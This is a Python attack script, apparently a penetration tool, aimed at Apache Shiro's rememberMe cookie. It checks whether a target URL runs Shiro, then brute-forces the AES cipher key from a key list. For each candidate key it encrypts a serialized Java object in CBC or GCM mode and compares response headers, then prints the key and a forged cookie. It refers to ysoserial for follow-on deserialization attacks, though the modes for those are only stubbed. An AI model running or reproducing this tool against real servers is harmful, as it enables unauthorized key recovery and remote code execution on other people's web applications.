#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time    :   2021/12/24 01:02:02
# @Author  :   4nth0ny @Friday_lab
# @Version :   1.0

import argparse
import base64
import os
import re
import subprocess
import sys
import uuid

import requests
import urllib3
from Crypto.Cipher import AES

urllib3.disable_warnings()

PROXY={}

YSOSERIAL_PATH = "ysoserial.jar"

HEADER = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0", "Connection":"close"}

CHECK_DATA = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="

def check_shiro():
    request = requests.get(url, timeout=10, proxies=PROXY,
                    verify=False, headers=HEADER, allow_redirects=False)
    
    if int(str(request.status_code)[0:1]) in [4,5]:
        print("[!] The target URL redirected or inaccessible!")
        print("[!] The status code :" + str(request.status_code))
        exit()

    if data == None:
        request = requests.get(url, cookies={'rememberMe': "xxxx"}, timeout=10, proxies=PROXY,
                            verify=False, headers=HEADER, allow_redirects=False)
        res_length = len(str(request.headers))

        if "rememberMe" in str(request.headers):
            print("[*] Shiro framework exists for the target!")
            return res_length
        else:
            print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
            exit()
    else:
        request = requests.post(url, cookies={'rememberMe': "xxxx"}, timeout=10, proxies=PROXY,
            verify=False, headers=HEADER, allow_redirects=False,data=data)
        res_length = len(str(request.headers))
        if "rememberMe" in str(request.headers):
            print("[*] Shiro framework exists for the target!")
            return res_length
        else:
            print("[!] The Shiro framework may not exist for the target,maybe you can add '-d' argument and try again")
            exit()

def brute_key(url, type, data, key=None):
    res_length = check_shiro()
    try:
        with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
            keys = fr.read().splitlines()

        for key in keys:
            if type == 'CBC':
                payload = CBCEncrypt(key,base64.b64decode(CHECK_DATA)).decode()

            if type == 'GCM':
                payload = GCMEncrypt(key,base64.b64decode(CHECK_DATA)).decode()

            if data != "":
                r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
                                verify=False, headers=HEADER, allow_redirects=False,data=data)
                rsp = len(str(r.headers))
            else:
                r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=PROXY,
                            verify=False, headers=HEADER,allow_redirects=False)
                rsp = len(str(r.headers))

            if res_length != rsp and r.status_code != 400:
                print("[*] The correct key : {0}".format(key))
                print("[*] The payload : {0}".format(payload))
                exit()

        else:
            return False

    except Exception as e:
        print(e)
        return False

def GCMEncrypt(key,file_body):
    iv                = os.urandom(16)
    cipher            = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
    ciphertext, tag   = cipher.encrypt_and_digest(file_body)
    ciphertext        = ciphertext + tag
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext

def CBCEncrypt(key,file_body):
    BS                = AES.block_size
    pad               = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode              = AES.MODE_CBC
    iv                = uuid.uuid4().bytes
    file_body         = pad(file_body)
    encryptor         = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    description='''
    Usage:
    python3 -m [mode] arguments
    
    example:

    '''
    parser = argparse.ArgumentParser(description="This is a simple tool to attack shiro with ysoserial")
    parser.add_argument('--mode', '-m', type=str, help='brute/yso/echo/encode', required=True)
    parser.add_argument('--type', '-t', type=str, help='Cipher type, gcm or cbc', default="CBC")
    parser.add_argument('--url', '-u', type=str , help='Target URL Address')
    parser.add_argument('--data', '-d', type=str , help='Using this parameter will initiate an HTTP request using the post method')
    
    # parser.add_argument('--key','-k', type=str , default=DEFAULT_SHIRO_KEY,help='Specific a key or the default key will be used')
    
    # parser.add_argument('--gadget','-g', type=str ,help='')
    # parser.add_argument('--command','-c', type=str ,help='Specific Execute Command')
    # parser.add_argument('--ser','-s', type=str ,help='Specific serialize File Path')
    args = parser.parse_args()

    mode = str.lower(args.mode)
    url  = args.url
    type = str.upper(args.type)
    data = args.data

    if mode not in ['brute','yso','echo','encode']:
        print("[!] Please check the mode,it must be brute/yso/echo/encode")
        exit()

    if type!=None and type not in ['GCM','CBC']:
        print("[!] Please check the type,it must be GCM or CBC")
        exit()

    if mode == "brute" and url == None:
        print("[!] Please specify the target URL!")
        exit()

    if mode == "brute" and url and type=="CBC":
        print("[*] your mode : " + mode)
        print("[*] Your url url : " + url)
        print("[*] Your Cipher type : " + type)
        if brute_key(url, type, data) == False:
            print("[!] The current chiper type is CBC,you can add the '- t GCM' argument and run again")
            exit()

    if mode == "brute" and url and type=="GCM":
        print("[*] your mode : " + mode)
        print("[*] Your url url : " + url)
        print("[*] Your Cipher type : " + type)
        if brute_key(url, type, data) == False:
            print("[!] The current chiper type is GCM,you can add the '- t CBC' argument and run again")
            exit()